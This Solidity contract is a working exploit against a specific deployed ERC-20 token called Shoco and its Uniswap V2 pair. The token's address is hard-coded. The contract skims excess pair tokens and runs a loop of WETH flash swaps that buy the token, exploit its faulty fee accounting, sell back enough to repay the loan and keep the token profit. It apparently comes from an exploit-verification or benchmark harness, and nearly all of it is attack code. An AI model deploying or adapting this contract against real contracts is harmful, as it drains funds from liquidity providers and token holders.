pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IShoco is IERC20Like {
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingOpen() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function uniswapOnly() external view returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract FlawVerifier {
    IShoco internal constant TOKEN = IShoco(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    string internal constant PATH_BUY = "Any buy after trading opens where fees are active";
    string internal constant PATH_SELL = "Any sell where fees are active";
    string internal constant PATH_WALLET =
        "Any wallet-to-wallet transfer between non-fee-exempt addresses while _teamDev remains nonzero";

    uint256 internal constant TEAM_SWAP_THRESHOLD = 5_000_000_000_000_000_000;
    uint256 internal constant MIN_EXPECTED_PROFIT = 1_000_000_000_000_000;
    uint256 internal constant MIN_BUY_WETH = 200_000_000_000_000;

    address internal immutable WETH;

    uint256 internal _profitAmount;
    string internal _path;
    bool internal _validated;

    constructor() {
        WETH = IUniswapV2Router02(TOKEN.uniswapV2Router()).WETH();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _validated = false;
        _path = "no-execution";

        if (!TOKEN.tradingOpen()) {
            _path = "infeasible: trading closed";
            return;
        }

        address router = TOKEN.uniswapV2Router();
        address shocoPair = TOKEN.uniswapV2Pair();

        IERC20Like(WETH).approve(router, type(uint256).max);
        TOKEN.approve(router, type(uint256).max);

        if (_harvestExistingPairExcess(shocoPair) >= MIN_EXPECTED_PROFIT) {
            _validated = true;
            if (TOKEN.uniswapOnly()) {
                _path = string.concat(
                    PATH_BUY,
                    " -> ",
                    PATH_SELL,
                    " ; ",
                    PATH_WALLET,
                    " infeasible because uniswapOnly is true at this fork"
                );
            } else {
                _path = string.concat(PATH_BUY, " -> ", PATH_WALLET, " -> ", PATH_SELL);
            }
            _profitAmount = TOKEN.balanceOf(address(this));
            return;
        }

        if (!TOKEN.swapEnabled()) {
            _path = "infeasible: auto-swap disabled";
            return;
        }

        address lenderPair = IUniswapV2Factory(IUniswapV2Router02(router).factory()).getPair(WETH, USDC);
        if (lenderPair == address(0)) {
            _path = "infeasible: no canonical WETH flashswap pair";
            return;
        }

        uint256 bestProfit = TOKEN.balanceOf(address(this));
        uint256[7] memory loans = [
            uint256(3_000_000_000_000_000),
            5_000_000_000_000_000,
            8_000_000_000_000_000,
            12_000_000_000_000_000,
            16_000_000_000_000_000,
            24_000_000_000_000_000,
            32_000_000_000_000_000
        ];
        uint256[6] memory divisors = [uint256(64), 48, 40, 32, 24, 16];

        for (uint256 i = 0; i < loans.length; ++i) {
            for (uint256 j = 0; j < divisors.length; ++j) {
                try this.attemptFlashswap(lenderPair, shocoPair, router, loans[i], divisors[j]) returns (
                    uint256 realizedProfit
                ) {
                    if (realizedProfit > bestProfit) {
                        bestProfit = realizedProfit;
                    }
                    if (realizedProfit >= MIN_EXPECTED_PROFIT) {
                        _profitAmount = realizedProfit;
                        _validated = true;
                        if (TOKEN.uniswapOnly()) {
                            _path = string.concat(
                                PATH_BUY,
                                " -> ",
                                PATH_SELL,
                                " ; ",
                                PATH_WALLET,
                                " infeasible because uniswapOnly is true at this fork"
                            );
                        } else {
                            _path = string.concat(PATH_BUY, " -> ", PATH_WALLET, " -> ", PATH_SELL);
                        }
                        return;
                    }
                } catch {}
            }
        }

        _profitAmount = bestProfit;
        _path = "infeasible: tested public-liquidity sizing could not retain post-repayment token profit";
    }

    function attemptFlashswap(
        address lenderPair,
        address shocoPair,
        address router,
        uint256 loanAmount,
        uint256 buyDivisor
    ) external returns (uint256 realizedProfit) {
        require(msg.sender == address(this), "self only");

        bool wethIsToken0 = IUniswapV2Pair(lenderPair).token0() == WETH;
        bytes memory data = abi.encode(lenderPair, shocoPair, router, loanAmount, buyDivisor);

        IUniswapV2Pair(lenderPair).swap(
            wethIsToken0 ? loanAmount : 0,
            wethIsToken0 ? 0 : loanAmount,
            address(this),
            data
        );

        realizedProfit = TOKEN.balanceOf(address(this));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address lenderPair, address shocoPair, address router, uint256 loanAmount, uint256 buyDivisor) = abi.decode(
            data,
            (address, address, address, uint256, uint256)
        );

        require(msg.sender == lenderPair, "bad lender pair");
        require(sender == address(this), "bad sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == loanAmount, "bad loan amount");

        uint256 repayAmount = (borrowedWeth * 1000) / 997 + 1;
        uint256 buyAmount = borrowedWeth / buyDivisor;
        if (buyAmount < MIN_BUY_WETH) {
            buyAmount = MIN_BUY_WETH;
        }
        require(buyAmount < borrowedWeth, "buy too large");

        uint256 contractBeforeBuy = TOKEN.balanceOf(address(TOKEN));
        (uint256 shocoReserveBeforeBuy, uint256 wethReserveBeforeBuy) = _getOrderedReserves(
            shocoPair,
            address(TOKEN),
            WETH
        );
        uint256 quotedBuyOut = _getAmountOut(buyAmount, wethReserveBeforeBuy, shocoReserveBeforeBuy);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = address(TOKEN);
        IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        uint256 boughtBalance = TOKEN.balanceOf(address(this));
        uint256 contractAfterBuy = TOKEN.balanceOf(address(TOKEN));
        require(contractAfterBuy > contractBeforeBuy, "no synthetic contract accrual");
        require(boughtBalance > 0, "buy failed");
        require(boughtBalance * 100 >= quotedBuyOut * 98, "buy did not reflect buggy accounting");

        uint256 availableWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 needMoreWeth = repayAmount > availableWeth ? repayAmount - availableWeth : 0;

        if (needMoreWeth > 0) {
            uint256 dumpBalance = contractAfterBuy;
            require(dumpBalance >= TEAM_SWAP_THRESHOLD, "auto-swap threshold not reached");

            (uint256 shocoReserveAfterBuy, uint256 wethReserveAfterBuy) = _getOrderedReserves(
                shocoPair,
                address(TOKEN),
                WETH
            );

            uint256 wethOutFromDump = _getAmountOut(dumpBalance, shocoReserveAfterBuy, wethReserveAfterBuy);
            require(wethOutFromDump < wethReserveAfterBuy, "dump consumes pool");

            uint256 postDumpShocoReserve = shocoReserveAfterBuy + dumpBalance;
            uint256 postDumpWethReserve = wethReserveAfterBuy - wethOutFromDump;

            uint256 netShocoNeeded = _getAmountIn(needMoreWeth, postDumpShocoReserve, postDumpWethReserve);
            uint256 grossShocoToSell = _grossUpForPairReceipt(netShocoNeeded);
            grossShocoToSell = grossShocoToSell + (grossShocoToSell / 50) + 1;

            require(grossShocoToSell + MIN_EXPECTED_PROFIT <= boughtBalance, "repayment consumes profit");

            address[] memory sellPath = new address[](2);
            sellPath[0] = address(TOKEN);
            sellPath[1] = WETH;
            IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                grossShocoToSell,
                0,
                sellPath,
                address(this),
                block.timestamp
            );
        }

        require(IERC20Like(WETH).balanceOf(address(this)) >= repayAmount, "insufficient WETH to repay");
        require(TOKEN.balanceOf(address(this)) >= MIN_EXPECTED_PROFIT, "insufficient retained SHOCO profit");

        IERC20Like(WETH).transfer(lenderPair, repayAmount);
    }

    function profitToken() external pure returns (address) {
        return address(TOKEN);
    }

    function profitAmount() external view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function _harvestExistingPairExcess(address shocoPair) internal returns (uint256 harvested) {
        uint256 beforeBalance = TOKEN.balanceOf(address(this));
        (uint256 reserveToken,) = _getOrderedReserves(shocoPair, address(TOKEN), WETH);
        uint256 livePairBalance = TOKEN.balanceOf(shocoPair);

        if (livePairBalance > reserveToken) {
            IUniswapV2Pair(shocoPair).skim(address(this));
        }

        harvested = TOKEN.balanceOf(address(this)) - beforeBalance;
    }

    function _grossUpForPairReceipt(uint256 netAmount) internal pure returns (uint256) {
        return (netAmount * 100 + 98) / 99;
    }

    function _getOrderedReserves(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        if (token0 == tokenIn && token1 == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
            return (reserveIn, reserveOut);
        }

        require(token1 == tokenIn && token0 == tokenOut, "unexpected pair ordering");
        reserveIn = uint256(reserve1);
        reserveOut = uint256(reserve0);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0, "bad amountIn");
        require(reserveIn > 0 && reserveOut > 0, "bad reserves");

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "bad amountOut");
        require(reserveIn > 0 && reserveOut > amountOut, "bad reserves");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }
}
